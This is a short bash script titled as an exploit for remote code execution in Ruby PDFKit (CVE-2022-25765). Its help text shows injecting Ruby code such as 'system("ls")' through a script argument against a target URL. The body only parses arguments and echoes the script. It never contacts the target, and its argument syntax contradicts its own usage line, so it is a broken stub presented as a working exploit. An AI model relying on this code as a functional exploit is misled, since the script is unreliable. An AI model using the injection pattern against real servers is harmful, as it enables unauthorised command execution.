#!/bin/bash
# Exploit Title: Ruby PDFKit exploit
# Description: An exploitation of RCE in Ruby PDF kit (CVE-2022-25765)
# Date: 2022-11-29
# Exploit Author: @Atsukoro1

params=("url" "script")
url=""
script=""

if [ "$1" == "-h" ]; then
    echo "Exploitation of RCE in Ruby PDF kit (CVE-2022-25765)"
    echo "Usage: ./exploit.sh -u <url> -s <script>"
    echo "Example: ./exploit.sh -u http://localhost:3000 -s 'system(\"ls\")'"
    exit 0
fi

for arg in "$@"
do
    case $arg in
        -u=*|--url=*)
        url="${arg#*=}"
        shift

        ;;
        -s=*|--script=*)
        script="${arg#*=}"
        shift

        ;;

        *)
        echo "${arg} is not a valid argument"
        ;;
    esac
done

echo "${script}"